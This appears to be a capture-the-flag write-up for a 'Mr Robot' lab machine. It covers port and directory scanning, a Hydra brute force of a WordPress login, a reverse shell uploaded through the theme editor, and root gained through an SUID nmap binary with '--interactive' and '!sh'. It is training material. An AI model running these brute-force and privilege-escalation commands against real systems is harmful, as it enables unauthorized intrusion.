starting with nmap scan

sudo nmap -A -T4 --min-rate=5000 -v -p- 10.10.212.185 -oN nmap.txt

so we found 3 open ports
20,80,443

lets start our enum from port 80
seems nothing interesting, just an fsociety cli with commands which seems like  directories

lets find some hidden directory
gobuster dir -u http://mrrobot.com:80 -w /usr/share/wordlists/dirbuster

found a directories at the /robots page
found the first flag at /key_1_of_3.txt and what seem like a wordlist at fscity.dic

found some interesting wp-* directories and a login panel

It looks like our website is running on wordpress, so lets us wpscan to enum further and find usernames

wpscan couldnt find any user or password, so lts use hyrdra to bruteforce the user n pass on the login page using this cmd
hydra -L /home/hybrid/Downloads/fsocity.dic -p test mrrobot.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30

found a username Elliot.
now lets bruteforce the pwd using the same cmd
got a password ER28-0652

now that we are login, lets find a way to get a shell on the server
so we found a page that let us edit the themes on th page.

realized we could edit the themes, lets upload a reverse shell and navigate to it.
by uploading a reverse shell and setting up a listener on our machine, we got a shell back

lets stabilize it or make it interactive

    Target machine must have Python 2 or 3 installed

Stabilize your shell:

    Import pty module and spawn bash shell:

python3 -c 'import pty;pty.spawn("/bin/bash")'

Press CTRL + Z to background process and get back to your host machine
Use stty command to set terminal line settings and foreground back the target terminal:

stty raw -echo; fg

Set the terminal emulator to xterm:

export TERM=xterm

Press Enter

now lets elevate privelege

lets search for suid files to escalate our privelege to root

find / -perm -u=s -type f 2>/dev/null
we found an suid file
/usr/local/bin/nmap

searching through gtfobins we found this cmds for nmap privesc

make it interactive
/usr/local/bin/nmap --interactive
!sh
we are root now
get your root flag
cat /root/root.txt
